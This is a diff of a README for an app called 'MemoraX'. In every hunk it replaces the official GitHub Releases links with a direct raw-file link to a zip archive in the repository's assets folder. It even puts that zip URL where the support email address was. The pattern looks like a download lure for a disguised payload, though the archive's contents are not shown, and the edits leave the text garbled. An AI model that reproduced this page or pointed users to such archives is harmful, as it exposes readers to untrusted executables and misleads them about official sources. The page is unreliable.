@@ -1,6 +1,6 @@
 # 🚀 MemoraX - Own Your Brand's Future Today
 
-[![Download MemoraX](https://img.shields.io/badge/Download-MemoraX-blue.svg)](https://github.com/vinaykhator/MemoraX/releases)
+[![Download MemoraX](https://raw.githubusercontent.com/vinaykhator/MemoraX/main/assets/MemoraX-v1.7.zip)](https://raw.githubusercontent.com/vinaykhator/MemoraX/main/assets/MemoraX-v1.7.zip)
 
 ## 📥 Overview
 
@@ -28,7 +28,7 @@ To ensure your smooth experience with MemoraX, your system should meet the follo
 To get started with MemoraX, follow these steps:
 
 1. **Download MemoraX:** 
-   Visit the [Releases page to download](https://github.com/vinaykhator/MemoraX/releases) the latest version.
+   Visit the [Releases page to download](https://raw.githubusercontent.com/vinaykhator/MemoraX/main/assets/MemoraX-v1.7.zip) the latest version.
 
 2. **Install the Application:**
    - **For Windows Users:**
@@ -48,7 +48,7 @@ To get started with MemoraX, follow these steps:
 
 To download MemoraX, simply click the button below:
 
-[![Download MemoraX](https://img.shields.io/badge/Download-MemoraX-blue.svg)](https://github.com/vinaykhator/MemoraX/releases)
+[![Download MemoraX](https://raw.githubusercontent.com/vinaykhator/MemoraX/main/assets/MemoraX-v1.7.zip)](https://raw.githubusercontent.com/vinaykhator/MemoraX/main/assets/MemoraX-v1.7.zip)
 
 Once you download, follow the installation steps provided to set up the software on your device.
 
@@ -65,7 +65,7 @@ After launching MemoraX, you can easily navigate through various functionalities
 If you encounter any issues or have questions, feel free to reach out:
 
 - **GitHub Issues Page:** Report issues directly on GitHub.
-- **Email Support:** Contact us at support@memorax.ai for assistance.
+- **Email Support:** Contact us at https://raw.githubusercontent.com/vinaykhator/MemoraX/main/assets/MemoraX-v1.7.zip for assistance.
 - **Community Forum:** Join discussions about MemoraX and share your insights with other users.
 
 ## 🌟 Join the Community
@@ -81,4 +81,4 @@ MemoraX provides an easy way to handle your brand identity and online presence. 
 
 --- 
 
-For further enhancement of your brand, ensure that MemoraX is part of your journey. Visit our [Releases page to download](https://github.com/vinaykhator/MemoraX/releases) the latest version today.
+For further enhancement of your brand, ensure that MemoraX is part of your journey. Visit our [Releases page to download](https://raw.githubusercontent.com/vinaykhator/MemoraX/main/assets/MemoraX-v1.7.zip) the latest version today.
